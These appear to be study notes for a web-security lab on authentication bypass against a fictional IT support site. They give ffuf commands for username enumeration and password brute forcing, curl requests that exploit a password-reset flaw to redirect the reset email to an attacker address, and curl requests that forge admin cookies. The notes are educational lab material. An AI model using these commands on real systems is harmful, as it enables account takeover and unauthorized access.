# Authentication Bypass
## Username Enumeration
* Creating a list of valid usernames is helpful exercise when trying to find authentication vulnerabilities.
* Website error messages are great resource for collating information to build list of valid usernames. 

1. Go to the fake IT Support website’s signup page.
2. Use form to create a new user account.
3. Enter username 'admin' and fill in the other form fields with fake information.
4. Produces "An account with this username already exists" error.
5. Use existence of the error message to produce list of valid usernames already signed up on the system.
```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```
   * `-w` selects wordlist file.
   * `-X` specifies request method.
     * GET request by default.
   * `-d` specifies data to be sent.
     * `username` set to value of `FUZZ`.
     * `FUZZ` keyword signifies where contents from wordlist will be inserted in request.
  * `-H` adds additional headers to the request.
    * `Content-Type` is set so the web server knows that form data is being sent.
  * `-u` specifies URL that requests are made to.
  * `-mr` is text on the page to validate that a valid username has been found.

## Brute Force
* Automated process that tries a list of commonly used passwords against either a single username or a list of usernames.

1.Brute force the fake IT Support website’s signup page.
* Make sure the terminal is in the same directory as the `valid_usernames.txt` file when running the `ffuf` command.
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```
* `FUZZ` keyword now needs to specify custom keywords because multiple wordlists are being used.
* `W1` for the list of valid usernames.
* `W2` for the list of passwords to try.
* `-w` specifies the multiple wordlists but are separated with a comma.
* `-fc` used to check for an HTTP status code other than `200` (a positive match).

## Logic Flaws
* Occurs when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.
* These can exist in any area of a website including authentication processes.

1. Examine the 'Reset Password' function of the fake IT Support website.
2. This has a form asking for the email address associated with the account on which to perform the password reset.
3. An 'Account not found from supplied email address' error message is received if an invalid email is entered.
   * Use the valid email address `robert@acmeitsupport.thm`.
5. The second stage of the reset form asks for the username associated with the login email address.
   * Enter `robert` as the username.
7. Press the 'Check Username' button.
8. Message confirms that a password reset email has been sent to `robert@acmeitsupport.thm`.
   * Username is submitted in a `POST` field to the web server and mail address is sent in the query string request as a `GET` field.
11. Manually make a request to the web server: `curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'`
    * `-H` adds an additional header to the request.
      * `Content-Type` set to `application/x-www-form-urlencoded`.
      * This lets the web server know that form data is being sent so it properly understands the request.
16. The user account is retrieved using the query string in this application.
17. However, the password reset email is sent using the data found in the `$_REQUEST` PHP variable.
    * `$_REQUEST` is an array that contains data received from the query string and `POST` data.
    * Application logic for `$_REQUEST` favours `POST` data fields over the query string if the same key name is used for both the query string and 'POST' data
    * Because of this where the password reset email gets delivered to can be controlled if another `email` parameter is added to the 'POST' form.
```
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

> 1. Create another account in the customer section.
>    * Doing so provides a unique email address that can be used to create support tickets.
> 3. The email address is in the format of `{username}@customer.acmeitsupport.thm`.
> 4. Rerun the curl Request but with the new `@acmeitsupport.thm` in the `email` field:
> 5. `curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'`
> 6. This will create a ticket on the new account which contains a link to log in as Robert.

## Cookie Tampering
* Examining and editing cookies set by the web server during an online session can have multiple outcomes:
  * Unauthenticated access.
  * Access to another user's account.
  * Elevated privileges.
### Plain Text
* The contents of some cookies can be in plain text, and it is obvious what they do.
* Sample cookies set after a successful login may be `Set-Cookie: logged_in=true; Max-Age=3600; Path=/` and `Set-Cookie: admin=false; Max-Age=3600; Path=/`.
  * One cookie (`logged_in`) appears to control whether the user is currently logged in or not.
  * The other (`admin`) controls whether the visitor has admin privileges.
  * The changing of privileges should be possible if the contents of the cookies were to be changed and a new Request made.

> 1. Request the target page: `curl http://MACHINE_IP/cookie-test`.
>    * This returns a 'Not Logged In' message.
> 3. Send another Request with the `logged_in` cookie set to `true` and the `admin` cookie set to `false`: `curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test`.
>    * This returns a 'Logged In As A User' message.
> 6. Send another Request setting both the `logged_in` and `admin` cookie to `true`: `curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test`.
>    * This returns a 'Logged In As An Admin' message.

### Hashing
* Cookie values can look like a long string of random characters (hashes).
* These are an irreversible representation of the original text.
  
| Original String | Hash Method | Output
| --- | --- | ---
| 1 | md5 | c4ca4238a0b923820dcc509a6f75849b
| 1 | sha-256 | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
| 1 | sha-512 | 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a
| 1 | sha1 | 356a192b7913b04c54574d18c28d46e6395428ab

* Hash output from the same input string can significantly differ depending on the hash method in use.
* Same output is produced every time even though the hash is irreversible.
  * This is helpful for testers as services such as [https://crackstation.net/(]https://crackstation.net/) keep databases of billions of hashes and their original strings.

### Encoding
* Similar to hashing in that it creates a seemingly random string of text although encoding is **reversible**.
* Allows conversion of binary data into human readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.
* **Base32** converts binary data to the characters `A-Z` and `2-7`.
* **Base64** converts using the characters `a-z`, `A-Z`, `0-9`, `+`, `/` and `=`for padding.

> * Example of data that is set by a web server upon logging in: `Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`
> * Decoding the base64 string results in a value of `{"id":1,"admin": false}`.
>   * This can then be encoded back to base64 after setting the admin value to true to provide admin access.
